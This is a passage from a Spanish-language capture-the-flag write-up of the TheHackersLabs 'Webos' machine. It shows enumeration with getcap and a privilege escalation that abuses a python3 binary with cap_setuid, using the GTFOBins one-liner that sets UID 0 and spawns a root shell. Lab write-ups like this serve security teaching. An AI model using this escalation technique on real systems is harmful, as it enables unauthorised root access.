Linux TheHackersLabs-Webos 6.1.0-22-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.94-1 (2024-06-21) x86_64
...
Last login: Thu Jul 18 11:45:53 2024
webos@TheHackersLabs-Webos:~$ whoami
webos
```
Estamos dentro.

Ya podemos ver la flag del usuario:
```bash
webos@TheHackersLabs-Webos:~$ ls
python3  user.txt  webito
webos@TheHackersLabs-Webos:~$ cat user.txt
...
```

### Escalando Privilegios Abusando de Capabilities de Binario Python3 {#Python3}

No podemos ver qué privilegios tiene nuestro usuario, pues necesitamos su contraseña:
```bash
webos@TheHackersLabs-Webos:~$ sudo -l
[sudo] contraseña para webos: 
Lo siento, pruebe otra vez.
[sudo] contraseña para webos: 
sudo: 1 incorrect password attempt
```

Tampoco hay un grupo del que nos podamos aprovechar:
```bash
webos@TheHackersLabs-Webos:~$ id
uid=1001(webos) gid=1001(webos) grupos=1001(webos),1002(webito)
```
Recordando el binario **python3** que tiene el **usuario webos**, aparte de que el dueño es el **Root**, me parece bastante extraño que esté ahí.

El binario no tiene **permisos SUID**, pero podemos ver qué capabilities tiene.

Para poder verlas, necesitamos el binario **getcap**, pero no parece estar en el directorio `/bin`. Entonces, podemos buscarlo con **find**:
```bash
webos@TheHackersLabs-Webos:~$ find / -name getcap -type f 2>/dev/null
/usr/sbin/getcap
```
Lo encontramos.

Ahora, veamos qué capabilities tiene:
```bash
webos@TheHackersLabs-Webos:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
/home/webos/python3 cap_setuid=ep
```
Muy bien, el binario tiene la capability `cap_setuid=ep`, pues es una capacidad del **kernel de Linux** que permite a un proceso cambiar su **UID** efectivo, real y guardado (es decir, actuar como otro usuario).

Esto nos puede permitir escalar privilegios.

Tenemos una forma de abusar de esta capability en la **guía de GTFOBins**:
* <a href="https://gtfobins.github.io/gtfobins/python/" target="_blank">GTFOBins: python</a>

Usaremos el siguiente comando:

<p align="center">
<img src="/assets/images/THL-writeup-webos/Captura15.png">
</p>

Ejecutémoslo:
```bash
webos@TheHackersLabs-Webos:~$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@TheHackersLabs-Webos:~# whoami
root
```
Somos **Root**.

Obtengamos la última flag:
```bash
root@TheHackersLabs-Webos:~# cd /root
root@TheHackersLabs-Webos:/root# ls
root.txt
root@TheHackersLabs-Webos:/root# cat root.txt
...
```
Y con esto, terminamos la máquina.
